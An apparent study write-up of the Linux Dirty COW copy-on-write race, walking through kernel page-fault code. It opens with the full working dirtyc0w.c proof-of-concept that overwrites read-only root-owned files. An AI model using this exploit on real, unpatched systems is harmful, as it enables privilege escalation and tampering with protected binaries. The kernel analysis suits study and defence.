# 0x00 Impact
1. allow attackers to gain write access to read-only memory mappings and thus increase their privileges
2. allow attackers with a local system account to modify ondisk binaries and bypass the standard permissions that would prevent modification without an appropriate permission set

# 0x01 POC
```c
/*
####################### dirtyc0w.c #######################
$ sudo -s
# echo this is not a test > foo
# chmod 0404 foo
$ ls -lah foo
-r-----r-- 1 root root 19 Oct 20 15:23 foo
$ cat foo
this is not a test
$ gcc -pthread dirtyc0w.c -o dirtyc0w
$ ./dirtyc0w foo m00000000000000000
mmap 56123000
madvise 0
procselfmem 1800000000
$ cat foo
m00000000000000000
####################### dirtyc0w.c #######################
*/
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

void *map;
int f;
struct stat st;
char *name;
 
void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i<100000000;i++)
  {
/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
> This is achieved by racing the madvise(MADV_DONTNEED) system call
> while having the page of the executable mmapped in memory.
*/
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf("madvise %d\n\n",c);
}
 
void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;
/*
You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
>  The in the wild exploit we are aware of doesn't work on Red Hat
>  Enterprise Linux 5 and 6 out of the box because on one side of
>  the race it writes to /proc/self/mem, but /proc/self/mem is not
>  writable on Red Hat Enterprise Linux 5 and 6.
*/
  int f=open("/proc/self/mem",O_RDWR);
  int i,c=0;
  for(i=0;i<100000000;i++) {
/*
You have to reset the file pointer to the memory position.
*/
    lseek(f,(uintptr_t) map,SEEK_SET);
    c+=write(f,str,strlen(str));
  }
  printf("procselfmem %d\n\n", c);
}
 
 
int main(int argc,char *argv[])
{
/*
You have to pass two arguments. File and Contents.
*/
  if (argc<3) {
  (void)fprintf(stderr, "%s\n",
      "usage: dirtyc0w target_file new_content");
  return 1; }
  pthread_t pth1,pth2;
/*
You have to open the file in read only mode.
*/
  f=open(argv[1],O_RDONLY);
  fstat(f,&st);
  name=argv[1];
/*
You have to use MAP_PRIVATE for copy-on-write mapping.
> Create a private copy-on-write mapping.  Updates to the
> mapping are not visible to other processes mapping the same
> file, and are not carried through to the underlying file.  It
> is unspecified whether changes made to the file after the
> mmap() call are visible in the mapped region.
*/
/*
You have to open with PROT_READ.
*/
  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
  printf("mmap %zx\n\n",(uintptr_t) map);
/*
You have to do it on two threads.
*/
  pthread_create(&pth1,NULL,madviseThread,argv[1]);
  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
/*
You have to wait for the threads to finish.
*/
  pthread_join(pth1,NULL);
  pthread_join(pth2,NULL);
  return 0;
}
```

## pseudocode
```c
Main:
    fd = open(filename, O_RDONLY)
    fstat(fd, &st)
    map = mmap(NULL, st.st_size , PROT_READ, MAP_PRIVATE, fd, 0)
    start Thread1
    start Thread2
    
Thread1：
    f = open("/proc/self/mem", O_RDWR)
    while (1):
        lseek(f, map, SEEK_SET)
        write(f, shellcode, strlen(shellcode))
        
Thread2：
    while (1):
        madvise(map, 100, MADV_DONTNEED)
```

Firstly we open the **readonly** file `foo` and use flag `MAP_PRIVATE` to map it into memory, this is for creating a private **copy-on-write** mapping.
Updates to the mapping are not visible to other processes mapping the same file, and are not carried through to the underlying file.

Then we open two thread:
1. write to the mapping region using COW
2. use `madvise(MADV_DONTNEED)` system call to release the memory region, in order to interfere with another thread's COW process

# Vulnerability analysis
When we using `mmap` to map the region using `MAP_PRIVATE` flag, when we write to the file, we will write to the mappings region create by COW machenism, and the original files won't be affected.

```
faultin_page
  handle_mm_fault
    __handle_mm_fault
      handle_pte_fault
        do_fault <- pte is not present
	  do_cow_fault <- FAULT_FLAG_WRITE
	    alloc_set_pte
	      maybe_mkwrite(pte_mkdirty(entry), vma) <- mark the page dirty but keep it RO 
# Returns with 0 and retry
follow_page_mask
  follow_page_pte
    (flags & FOLL_WRITE) && !pte_write(pte) <- retry fault
faultin_page
  handle_mm_fault
    __handle_mm_fault
      handle_pte_fault
        FAULT_FLAG_WRITE && !pte_write
	  do_wp_page
	    PageAnon() <- this is CoWed page already
	    reuse_swap_page <- page is exclusively ours
	    wp_page_reuse
	      maybe_mkwrite <- dirty but RO again
	      ret = VM_FAULT_WRITE
((ret & VM_FAULT_WRITE) && !(vma->vm_flags & VM_WRITE)) <- we drop FOLL_WRITE
# Returns with 0 and retry as a read fault
cond_resched -> different thread will now unmap via madvise
follow_page_mask
  !pte_present && pte_none
faultin_page
  handle_mm_fault
    __handle_mm_fault
      handle_pte_fault
        do_fault <- pte is not present
	  do_read_fault <- this is a read fault and we will get pagecache page!
```
The procedure we `get_user_pages()`:
1. use `follow_page_mask` to find the page of virtual memory, with `FOLL_WRITE` flag. Coz the page is not in the memory, `follow_page_mask` will return NULL. We encounter **first fail**, enter `faultin_page` function and finally enter `do_cow_fault` and alloc a page without `_PAGE_RW` flag. Return 0.
2. Start the loop again, use `follow_page_mask` the second time, with `FOLL_WRITE` flag. Because it doesn't meet the requirement *((flags & FOLL_WRITE) && !pte_write(pte))*, it **fail the second time**, and finally enter the `do_wp_page` function and alloc COW page. drop `FOLL_WRITE` flag in the outer function. Return 0.
3. Start the loop again, use `follow_page_mask` the third time, without `FOLL_WRITE` flag. Get the page successfully.

## Read the source code
We can use [Linux 4.7.10](https://elixir.bootlin.com/linux/v4.7.10/source) as reference:

`get_user_page` is a set of functions, and they all lead to `__get_user_pages`
```c
long __get_user_pages(struct task_struct *tsk, struct mm_struct *mm,
        unsigned long start, unsigned long nr_pages,
        unsigned int gup_flags, struct page **pages,
        struct vm_area_struct **vmas, int *nonblocking)
{
    do {
retry:
        cond_resched(); /* 进程调度 */
        ...
        page = follow_page_mask(vma, start, foll_flags, &page_mask); /* 查找虚拟地址的page */
        if (!page) {
            ret = faultin_page(tsk, vma, start, &foll_flags, nonblocking); /* 处理失败的查找 */
            switch (ret) {
            case 0:
                goto retry;
            }
        }
        if (page)
            加入page数组
    } while (nr_pages);
}
```
this function use `follow_page_mask` to find the corresponding page for virtual memory. If failed, it will enter `faultin_page`, retry severial times until find the page or encounter fault.
Because `cond_resched()` is used everytime at the beginning of the loop, to reschdule threads, there are chances of **race condition**.

### first page search
`follow_page_mask` use the process's virtual memory following `pgd` `gud` `pte` to search the page. Because we access the memory the first time, the page table is empty now, we return NULL and the outer function enter `faultin_page` to get the page.
```c
struct page *follow_page_mask(
              struct vm_area_struct *vma, /* [IN] 虚拟地址所在的vma */
              unsigned long address, /* [IN] 待查找的虚拟地址 */
              unsigned int flags, /* [IN] 标记 */
              unsigned int *page_mask /* [OUT] 返回页大小 */
              )
{
    ...
        return no_page_table(vma, flags);
    ...
}

static struct page *no_page_table(struct vm_area_struct *vma,
    unsigned int flags)
{
    if ((flags & FOLL_DUMP) && (!vma->vm_ops || !vma->vm_ops->fault))
        return ERR_PTR(-EFAULT);
    return NULL;
}
```

`faultin_page` tackle the situation that `follow_page_mask` can't find the page.
set `FAULT_FLAG_WRITE` flag, then follow `handle_mm_fault -> __handle_mm_fault -> handle_pte_fault -> do_fault -> do_cow_fault` **allocate page**.
```c
static int faultin_page(struct task_struct *tsk, struct vm_area_struct *vma,
    unsigned long address, unsigned int *flags, int *nonblocking)
{
    struct mm_struct *mm = vma->vm_mm;

    if (*flags & FOLL_WRITE)
        fault_flags |= FAULT_FLAG_WRITE; /* 标记失败的原因 WRITE */
    ...
    ret = handle_mm_fault(mm, vma, address, fault_flags); /* 第一次分配page并返回 0 */
    ...
    return 0;

}

static int handle_pte_fault(struct mm_struct *mm,
         struct vm_area_struct *vma, unsigned long address,
         pte_t *pte, pmd_t *pmd, unsigned int flags)
{
    if (!pte_present(entry))
        if (pte_none(entry))
            return do_fault(mm, vma, address, pte, pmd, flags, entry); /* page不在内存中，调页 */
}

static int do_fault(struct mm_struct *mm, struct vm_area_struct *vma,
    unsigned long address, pte_t *page_table, pmd_t *pmd,
    unsigned int flags, pte_t orig_pte)
{
    if (!(vma->vm_flags & VM_SHARED)) /* VM_PRIVATE模式，使用写时复制(COW)分配页 */
        return do_cow_fault(mm, vma, address, pmd, pgoff, flags,
                orig_pte);
}

static int do_cow_fault(struct mm_struct *mm, struct vm_area_struct *vma,
    unsigned long address, pmd_t *pmd,
    pgoff_t pgoff, unsigned int flags, pte_t orig_pte)
{
    new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address); /* 分配一个page */

    ret = __do_fault(vma, address, pgoff, flags, new_page, &fault_page,
         &fault_entry);

    do_set_pte(vma, address, new_page, pte, true, true); /* 设置new_page的PTE */
}

static int __do_fault(struct vm_area_struct *vma, unsigned long address,
        pgoff_t pgoff, unsigned int flags,
        struct page *cow_page, struct page **page,
        void **entry)
{
    ret = vma->vm_ops->fault(vma, &vmf);
}

void do_set_pte(struct vm_area_struct *vma, unsigned long address,
    struct page *page, pte_t *pte, bool write, bool anon)
{
    pte_t entry;

    flush_icache_page(vma, page);
    entry = mk_pte(page, vma->vm_page_prot);
    if (write)
        entry = maybe_mkwrite(pte_mkdirty(entry), vma); /* 带_RW_DIRTY,不带_PAGE_RW */
    if (anon) { /* anon = 1 */
        page_add_new_anon_rmap(page, vma, address, false);
    } else {
        inc_mm_counter_fast(vma->vm_mm, mm_counter_file(page));
        page_add_file_rmap(page);
    }

    set_pte_at(vma->vm_mm, address, pte, entry);
}

static inline pte_t maybe_mkwrite(pte_t pte, struct vm_area_struct *vma)
{
    if (likely(vma->vm_flags & VM_WRITE)) /* 因为是只读的，所以pte不带_PAGE_RW标记 */
        pte = pte_mkwrite(pte);
    return pte;
}
```

Now the first search ends and pagefault solved, the anon page is allocated in memory, read-only.

### Second search
because `FALL_WRITE` flag and the page is read-only, the `follow_page_mask` will return NULL, and enter `faultin_page`.
```c
struct page *follow_page_mask(...)
{
    return follow_page_pte(vma, address, pmd, flags);
}

static struct page *follow_page_pte(...)
{
    if ((flags & FOLL_WRITE) && !pte_write(pte)) { /* 查找可写的页，但是该页是只读的 */
        pte_unmap_unlock(ptep, ptl);
        return NULL;
    }
}
```

when using `faultin_page`, we will follow the path: `faultin_page -> handle_mm_fault -> __handle_mm_fault -> handle_pte_fault`, because we don't have the write permission  when `handle_pte_fault`, we will enter `do_wp_page`
```c
static int handle_pte_fault(...)
{
    if (flags & FAULT_FLAG_WRITE) /* faultin_page函数开头设置了该标志 */
        if (!pte_write(entry))
            return do_wp_page(mm, vma, address, pte, pmd, ptl, entry);
}
```

`do_wp_page` will decide whether to copy current page or not, and because the above aloccated page **is used only by current thread**, so no copy, just use it.
```c
static int do_wp_page(struct mm_struct *mm, struct vm_area_struct *vma,
    unsigned long address, pte_t *page_table, pmd_t *pmd,
    spinlock_t *ptl, pte_t orig_pte)
{
    old_page = vm_normal_page(vma, address, orig_pte); /* 得到之前分配的只读页，该页是匿名的页 */

    if (PageAnon(old_page) && !PageKsm(old_page)) {
        int total_mapcount;
        if (reuse_swap_page(old_page, &total_mapcount)) { /* old_page只有自己的进程在使用，直接使用就行了，不用再复制了 */
            if (total_mapcount == 1) {
                /*
                 * The page is all ours. Move it to
                 * our anon_vma so the rmap code will
                 * not search our parent or siblings.
                 * Protected against the rmap code by
                 * the page lock.
                 */
                page_move_anon_rmap(old_page, vma);
            }
            unlock_page(old_page);
            return wp_page_reuse(mm, vma, address, page_table, ptl,
                         orig_pte, old_page, 0, 0);
        }
        unlock_page(old_page);
    }
}

static inline int wp_page_reuse(struct mm_struct *mm,
            struct vm_area_struct *vma, unsigned long address,
            pte_t *page_table, spinlock_t *ptl, pte_t orig_pte,
            struct page *page, int page_mkwrite,
            int dirty_shared)
{
    entry = maybe_mkwrite(pte_mkdirty(entry), vma); //带_RW_DIRTY,不带_PAGE_RW 
    if (ptep_set_access_flags(vma, address, page_table, entry, 1))
        update_mmu_cache(vma, address, page_table);

    return VM_FAULT_WRITE;
}
```

note that `wp_page_reuse` returns *VM_FAULT_WRITE*, so `handle_mm_fault` returns *VM_FAULT_WRITE*, the `faultin_page` will remove `FOLL_WRITE` flag and return 0;
```c
static int faultin_page(...)
{
    ret = handle_mm_fault(mm, vma, address, fault_flags); /* 返回 VM_FAULT_WRITE */

    /* 去掉FOLL_WRITE标记， */
    if ((ret & VM_FAULT_WRITE) && !(vma->vm_flags & VM_WRITE))
        *flags &= ~FOLL_WRITE;
    return 0;
}
```

### Third search
Because `FOLL_WRITE` is removed at the last time, this time `follow_page_mask` will return the page we allocate. **COW is finished now**.


# POC again
`madvise(MADV_DONTNEED)` syscall is to give system advise on memory usage, `MADV_DONTNEED` means we are not going to access the memory again, so the kernel can release the page. 
```c
static long madvise_dontneed(struct vm_area_struct *vma,
                 struct vm_area_struct **prev,
                 unsigned long start, unsigned long end)
{
    ...
    zap_page_range(vma, start, end - start, NULL);
    return 0;
}

void zap_page_range(struct vm_area_struct *vma, unsigned long start,
    unsigned long size, struct zap_details *detail
{
    ...
    for ( ; vma && vma->vm_start < end; vma = vma->vm_next)
        unmap_single_vma(&tlb, vma, start, end, details);
    ...
}
```

Now we go through the COW again:
1. first `follow_page_mask(FOLL_WRITE)`, coz page is not in memory, use `pagefault`
2. second `follow_page_mask(FOLL_WRITE)`, coz page don't have write prmission, remove `FOLL_WRITE`
3. third `follow_page_mask(~FOLL_WRITE)`, secceed

`__get_user_pages` use `cond_resched()` to reschedule threads everytime before search page, introduce the potential of race condition.
the `FOLL_WRITE` flag is removed after we allocating COW page, if now **another thread frees the page**, the third search won't find the page, and will do pagefault again, this time without `FOLL_WRITE` flag, and won't do COW, Now the `get_user_pages` get the page with `__PAGE_DIRTY`

1. first `follow_page_mask(FOLL_WRITE)`, coz page is not in memory, use `pagefault`
2. second `follow_page_mask(FOLL_WRITE)`, coz page don't have write prmission, remove `FOLL_WRITE`
3. another thread free the COW page we created
4. third `follow_page_mask(~FOLL_WRITE)`, coz page is not in memory, use `pagefault`
5. forth `follow_page_mask(~FOLL_WRITE)`, get the page successfully, without COW